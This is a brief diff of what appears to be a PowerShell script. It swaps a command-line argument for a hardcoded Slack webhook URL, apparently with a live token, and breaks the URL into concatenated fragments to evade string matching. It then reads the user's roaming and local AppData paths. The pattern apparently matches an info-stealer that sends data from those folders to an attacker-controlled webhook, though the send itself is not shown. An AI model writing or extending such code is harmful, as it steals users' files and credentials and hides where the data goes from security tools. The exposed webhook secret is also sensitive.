@@ -1,4 +1,4 @@
-$uriSlack = $args[0]
+$uriSlack = "https://h"+"ook"+"s.sla"+"ck"+".com/serv"+"ices/T01Q"+"U9DSY2U/B050"+"L0VV73R/"+"2Xf6XxXxhAXOO"+"zgxxWrz9Tf3"
 
 $roaming=$env:APPDATA
 $local=$env:LOCALAPPDATA
